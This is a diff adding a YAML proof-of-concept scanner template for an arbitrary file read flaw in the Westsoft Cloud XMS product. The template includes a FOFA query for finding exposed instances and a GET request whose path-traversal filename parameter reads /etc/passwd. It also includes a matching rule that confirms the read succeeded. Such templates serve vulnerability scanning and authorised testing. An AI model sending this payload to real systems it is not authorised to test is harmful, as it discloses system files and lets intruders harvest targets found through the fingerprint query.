@@ -1,0 +1,15 @@
+id: poc-yaml-xi-ruan-yun-download-anyfile-read
+info:
+  name: 西软云XMS download 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 西软云XMS
+  fofa: app="shiji-西软云XMS"
+requests:
+- method: GET
+  path: /FoxhisFileServer/action?method=download&filename=/..//..//..//..//..//..//..//..//..//..//..//../etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<") && contains(headers,"Server\x3a Westsoft")
+variables: {}
+transport: http
